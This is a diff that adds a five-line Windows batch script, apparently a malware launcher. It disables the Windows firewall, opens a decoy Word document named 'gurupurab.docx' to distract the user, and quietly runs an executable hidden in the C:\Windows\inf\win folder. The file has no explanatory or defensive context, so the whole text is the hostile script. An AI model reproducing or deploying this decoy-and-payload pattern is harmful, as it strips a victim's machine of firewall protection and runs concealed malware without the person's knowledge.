@@ -1,0 +1,5 @@
+@ echo off
+@ netsh firewall set opmode disable
+@ start "explorer.exe" "gurupurab.docx"
+@ C:\Windows\inf\win\soundmen.exe
+@ exit
